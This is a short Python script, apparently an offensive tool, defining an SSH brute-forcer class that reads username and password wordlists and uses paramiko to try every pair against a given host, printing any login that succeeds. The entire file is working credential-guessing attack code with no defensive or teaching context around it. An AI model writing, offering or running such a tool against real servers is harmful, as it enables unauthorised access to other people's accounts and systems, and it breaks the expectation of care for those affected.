import os
import sys
import paramiko
import time
class SSHBruteForcer:
    def __init__(self, usernames: str, wordlist:str) -> None:
        if not os.path.isfile(usernames):
            print("The usernames file was not found!")
            sys.exit(404)
        if not os.path.isfile(wordlist):
            print("The wordlist file was not found!")
            sys.exit(404)
        with open(usernames, 'r') as uf:
            self._users = uf.readlines()
        with open(wordlist, 'r') as wf:
            self._passwords = wf.readlines() 
    def _connect(self, host:str, user:str, password:str, port: int =22 ) -> bool:
        try:
            ssh_client =paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=host,port=port,username=user,password=password)
            return True
        except:
            ssh_client.close()
            return False
    def Run(self, host:str, delay: int = 1) -> None:
        for user in self._users:
            user = user.strip() 
            for password in self._passwords:
                password = password.strip()
                respond = self._connect(host=host, user= user, password = password)
                if respond:
                    print(f"ACCOUNT FOUND: [ssh] Host: {host} User: {user} Password: {password}")
                    break
                time.sleep(delay)